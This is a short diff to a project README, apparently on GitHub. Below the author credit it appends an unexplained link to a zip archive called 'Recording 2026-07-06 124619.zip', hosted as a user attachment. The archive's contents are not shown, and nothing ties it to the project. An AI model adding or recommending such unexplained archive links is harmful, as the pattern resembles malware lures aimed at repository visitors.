@@ -216,3 +216,6 @@ NEXT_PUBLIC_SUPABASE_ANON_KEY=
 **Ayush Carpenter**
 
 If you found this project helpful, consider giving it a ⭐ on GitHub!
+
+[Recording 2026-07-06 124619.zip](https://github.com/user-attachments/files/29691558/Recording.2026-07-06.124619.zip)
+
